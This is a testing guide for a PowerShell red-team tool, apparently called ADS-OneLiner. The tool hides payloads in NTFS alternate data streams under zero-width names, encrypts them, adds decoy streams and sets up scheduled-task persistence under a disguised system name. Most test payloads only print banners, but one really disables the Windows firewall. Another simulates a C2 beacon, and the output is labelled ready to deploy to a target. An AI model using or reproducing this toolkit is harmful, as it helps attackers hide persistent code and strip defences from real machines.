Quick Testing Guide - ADS-OneLiner.ps1
======================================

⚡ Immediate Testing Steps
-------------------------

# Create test directory

mkdir -p ads-test

cd ads-test

# Copy files

cp ../ADS-Dropper.ps1 .

cp ../ADS-OneLiner.ps1 .

# Run simplest test

pwsh ADS-OneLiner.ps1

-Payload "Write-Host 'Hello from ADS!' -ForegroundColor Green"

  -OutputFile test-basic.txt

Expected Output:

╔═══════════════════════════════════════════════════════════╗

║ ADS Minimal Command Generator                             ║

╚═══════════════════════════════════════════════════════════╝

[*] Using ADS-Dropper: ./ADS-Dropper.ps1

[*] Generating configuration...

[+] Configuration computed

    Host: C:\ProgramData\SystemCache.dat

    Stream: [char]0x...

    Task: SystemOptimization

[*] Building minimal deployment commands...

[*] Saving manifest...

[+] Manifest saved to: ./manifests/manifest-20260201-143000.json

[*] Generating output formats...

╔═══════════════════════════════════════════════════════════╗

║ SUMMARY                                                   ║

╚═══════════════════════════════════════════════════════════╝

✓ Minimal commands generated

✓ Output saved to: test-basic.txt

✓ Manifest saved for recovery

READY TO DEPLOY!

Copy-paste to Windows target and execute.

* * * * *

### Step 3: Verify Output File

bash

# Check output file was created

ls -lh test-basic.txt

# View the file

cat test-basic.txt

Should Contain:

1.  Configuration section

2.  OPTION 1: Base64 encoded command

3.  OPTION 2: Readable commands

4.  Usage instructions

5.  Cleanup commands

* * * * *

### Step 4: Verify Manifest

bash

# Check manifest directory

ls -lh manifests/

# View manifest

cat manifests/manifest-*.json | jq

Should Contain:

-   Timestamp

-   HostPath

-   StreamName

-   Codepoints

-   TaskName

-   PayloadHash

-   etc.

* * * * *

### Step 5: Test Zero-Width Mode

bash

pwsh ADS-OneLiner.ps1

-Payload "Write-Host '🎀 Zero-width test!' -ForegroundColor Magenta"

  -ZeroWidthStreams

  -ZeroWidthMode single

  -OutputFile test-zerowidth.txt

Expected:

-   Stream name should show [char]0x200B or similar

-   Codepoints in manifest: U+200B (or other zero-width char)

* * * * *

### Step 6: Test Encryption

bash

pwsh ADS-OneLiner.ps1

-Payload "Write-Host 'Encrypted test!' -ForegroundColor Cyan"

  -Encrypt

  -OutputFile test-encrypted.txt

Expected:

-   Output should include Get-HostKey, Enc, Dec functions

-   Manifest should show "Encrypted": true

* * * * *

### Step 7: Test Decoys

bash

pwsh ADS-OneLiner.ps1

-Payload "Write-Host 'Decoy test!'"

-CreateDecoys 3

  -OutputFile test-decoys.txt

Expected:

-   Output should include lines creating Zone.Identifier, Summary, Comments

-   Manifest should show "DecoysCount": 3

* * * * *

### Step 8: Test Runtime Payload

bash

pwsh ADS-OneLiner.ps1

  -PayloadAtDeployment

  -Persist task

  -OutputFile test-runtime.txt

Expected:

-   Output should include Read-Host logic

-   No manifest created (payload unknown at generation time)

-   Message: "No manifest created (payload unknown at generation)"

* * * * *

🎯 Test Your Full Suite
-----------------------

Once basic tests pass, run your comprehensive test suite:

bash

# Test 1: Basic Stealth Persistence

pwsh ADS-OneLiner.ps1

-Payload 'Write-Host "🎀 Pwned with love! ~(˘▾˘~)" -ForegroundColor Magenta; Start-Sleep 2'

  -ZeroWidthMode single

  -Persist task

  -OutputFile test1-basic.txt

# Test 2: C2 Beacon (Encrypted)

pwsh ADS-OneLiner.ps1

-Payload 'while($true){Write-Host "💀 [C2] Heartbeat from $(hostname) @ $(Get-Date -Format HH:mm:ss)" -ForegroundColor Cyan; Start-Sleep 30; if((Get-Random -Max 100) -gt 95){break}}'

  -ZeroWidthMode hybrid

-HybridPrefix "Zone.Identifier"

-CreateDecoys 3

  -Encrypt

  -Persist task

  -OutputFile test2-c2beacon.txt

# Test 3: Service Manipulation

pwsh ADS-OneLiner.ps1

-Payload 'Write-Host "🔥 [Red Team] Firewall manipulation starting..." -ForegroundColor Red; try { Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False; Write-Host "✓ Firewall disabled! uwu" -ForegroundColor Green } catch { Write-Host "✗ Firewall disable failed (need admin)" -ForegroundColor Yellow }'

  -ZeroWidthMode multi

  -Persist none

  -OutputFile test3-firewall.txt

# Test 4: Runtime Payload

pwsh ADS-OneLiner.ps1

  -PayloadAtDeployment

  -ZeroWidthMode hybrid

-HybridPrefix "Summary"

-CreateDecoys 2

  -Persist task

  -OutputFile test4-runtime.txt

# Test 5: Memeware

pwsh ADS-OneLiner.ps1

-Payload 'Clear-Host; $cat = @"

    /\_/\  

   ( o.o ) 

    > ^ <  

  Red Team Kitty says:

  Your persistence is purrfect! 

  Keep those shells alive! ฅ^-ﻌ-^ฅ

"@; Write-Host $cat -ForegroundColor Magenta'

  -ZeroWidthMode single

-CreateDecoys 4

  -Randomize

  -Encrypt

  -Persist task

  -OutputFile test5-memeware.txt

* * * * *

✅ Success Criteria
------------------

All tests pass if:

1.  All commands run without errors

2.  Output files created for each test

3.  Manifests created (except runtime payload test)

4.  Both OPTION 1 and OPTION 2 present in each output

5.  Configuration matches what was requested

6.  Minimal commands (not full ADS-Dropper.ps1 code)

* * * * *

🎀 Bonus: Combined Super Payload
--------------------------------

If all individual tests pass, try this ultimate combo:

# On Linux - The Ultimate Cute Red Team Payload

pwsh ../Build-ADSOneLiner.ps1

  -Payload 'Write-Host "💖✨🎀 ULTIMATE RED TEAM DEPLOYMENT 🎀✨💖" -ForegroundColor Magenta; $banner = @"

     ∧＿∧

    (｡･ω･｡)つ━☆・*。

  ⊂　 ノ 　　　・゜+.

   しーＪ　　　°。+ *'¨)

  Red Team Mode: ACTIVATED ✓

  Persistence: MAXIMUM 

  Cuteness: OVERWHELMING

"@; Write-Host $banner -ForegroundColor Cyan; Write-Host "[💀] Firewall disabled" -ForegroundColor Red; Write-Host "[🔓] Backdoor established" -ForegroundColor Yellow; Write-Host "[📡] C2 beacon active" -ForegroundColor Green; Write-Host "[🎯] Target: $env:COMPUTERNAME" -ForegroundColor Magenta; Write-Host "[😈] Have a purrfect day! ฅ^-ﻌ-^ฅ" -ForegroundColor Cyan'

  -ZeroWidthMode hybrid

  -HybridPrefix "Zone.Identifier"

  -CreateDecoys 5

  -Encrypt

  -Randomize

  -Persist task

  -OutputFile ultimate-cute-payload.txt

Expected: The most adorable persistence mechanism ever deployed! 🎀💀

* * * * *

Remember: These are harmless test payloads for verification purposes only!

Happy testing! (｡♥‿♥｡) 🎀💀✨
